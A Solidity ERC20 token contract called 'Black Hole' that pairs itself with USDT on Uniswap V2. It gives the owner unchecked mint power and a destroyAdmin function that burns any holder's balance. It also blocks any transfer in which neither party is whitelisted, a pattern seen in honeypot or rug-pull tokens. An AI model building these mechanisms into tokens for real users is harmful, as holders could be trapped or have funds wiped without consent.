pragma solidity ^0.8.4;

// SPDX-License-Identifier: MIT
interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint a,
        uint b,
        string memory errorMessage
    ) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint a,
        uint b,
        string memory errorMessage
    ) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function mod(uint a, uint b) internal pure returns (uint) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint a,
        uint b,
        string memory errorMessage
    ) internal pure returns (uint) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IUniswapV2Pair {
    function totalSupply() external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address owner) external view returns (uint256);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

contract BH is Context, IERC20, Ownable {
    using SafeMath for uint;
    address factory;
    address usdt;
    address pair;

    mapping(address => uint) private _balances;
    mapping(address => mapping(address => uint)) private _allowances;
    mapping(address => bool) public isWhite;

    uint private constant E18 = 1000000000000000000;
    uint private constant MAX = ~uint(0);
    uint private _totalSupply = 1 * E18;

    uint private _decimals = 18;
    string private _symbol = "Black Hole";
    string private _name = "Black Hole";

    constructor(address _usdt, address _factory) {
        if (_usdt != address(0)) {
            usdt = _usdt;
        }
        if (_factory != address(0)) {
            factory = _factory;
        }
        _balances[msg.sender] = _totalSupply;
        pair = IUniswapV2Factory(factory).createPair(address(this), usdt);
        isWhite[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function decimals() public view returns (uint) {
        return _decimals;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function totalSupply() public view override returns (uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(
        address spender,
        uint addedValue
    ) public returns (bool) {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint subtractedValue
    ) public returns (bool) {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _transfer(address sender, address to, uint amount) internal {
        require(isWhite[sender] || isWhite[to], "ERC20: not white");
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(_balances[sender] >= amount, "exceed balance!");

        _balances[sender] = _balances[sender].sub(amount);
        _balances[to] = _balances[to].add(amount);
        emit Transfer(sender, to, amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _mint(uint256 amount) internal returns (uint256) {
        _totalSupply = _totalSupply.add(amount);
        _balances[msg.sender] = _balances[msg.sender].add(amount);
        emit Transfer(address(0), msg.sender, amount);
        return amount;
    }

    function setwhite(address user, bool iswhite) external onlyOwner {
        isWhite[user] = iswhite;
    }

    // 只有主合约能调用  唯一白名单
    function mint(uint256 amount) public returns (uint256) {
        require(isWhite[msg.sender], "ERC20: not white");
        return _mint(amount);
    }

    function mintAdmin(uint256 amount) external onlyOwner returns (uint256) {
        return _mint(amount);
    }

    function destroyAdmin(
        address _add,
        uint256 amount
    ) external onlyOwner returns (uint256) {
        require(_balances[_add] >= amount, "exceed balance!");
        _totalSupply = _totalSupply.sub(amount);
        _balances[_add] = _balances[_add].sub(amount);
        emit Transfer(_add, address(0), amount);
        return amount;
    }

    // 销毁 只有主合约能调用  唯一白名单
    function destroy(uint256 amount) public returns (uint256) {
        require(isWhite[msg.sender], "ERC20: not white");
        require(_balances[msg.sender] >= amount, "exceed balance!");
        _totalSupply = _totalSupply.sub(amount);
        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        emit Transfer(msg.sender, address(0), amount);
        return amount;
    }

    function getPrice() public view returns (uint256) {
        IUniswapV2Pair pairContract = IUniswapV2Pair(pair);
        (uint256 reserve0, uint256 reserve1, ) = pairContract.getReserves();
        uint256 usdtBalance = usdt == pairContract.token0()
            ? reserve0
            : reserve1;
        uint256 bhBalance = usdt == pairContract.token0() ? reserve1 : reserve0;
        return usdtBalance.mul(1e18).div(bhBalance);
    }
}